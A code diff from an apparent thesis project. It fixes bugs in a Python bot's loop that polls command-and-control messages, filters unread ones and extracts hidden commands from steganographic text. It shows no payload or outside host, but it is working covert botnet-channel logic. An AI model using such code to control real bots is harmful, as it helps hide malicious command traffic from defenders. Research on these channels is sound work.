@@ -58,24 +58,22 @@ while waitingForC2:
         logger.debug("No C2 messages for a bot with my name {0}".format(botName))
         continue #<-- Go to the next loop itteration
     else:
-        logger.debug("{0} messages for a bot with my name {1}".format(len(filteredC2Messages, botName)))
+        logger.debug("{0} messages for a bot with my name {1}".format(len(filteredC2Messages), botName))
    
-    filteredC2Messages = c2Module.filterUnreadMessages(c2Messages=c2Messages)
+    #Filter the messages so only new messages will be processed
+    filteredC2Messages = c2Module.filterUnreadMessages(c2Messages=filteredC2Messages)
     if not filteredC2Messages:
         logger.debug("No messages new C2 messages".format(botName))
         continue #<-- Go to the next loop itteration
     else:
-        logger.debug("{0} new messages")
+        logger.debug("{0} new messages".format(len(filteredC2Messages)))
 
     #Switch to a variable name that is used in the thesis
     stegoTexts = filteredC2Messages
 
     #Extract the embedded-text from the stego-text
     for stegoText in stegoTexts:
-
-
-    #Extract the embedded text from the stego text response
-    stegoText=c2Messages
-    success, embeddedText = stegoModule.extractEmbeddedTextFromStegoText(stegoText=stegoText, stegoKey="bb")
+        success, embeddedText = stegoModule.extractEmbeddedTextFromStegoText(stegoText=stegoText, stegoKey="bb")
+        print(embeddedText)
     if not embeddedText or not success:
         continue #<-- Go to the next loop itteration
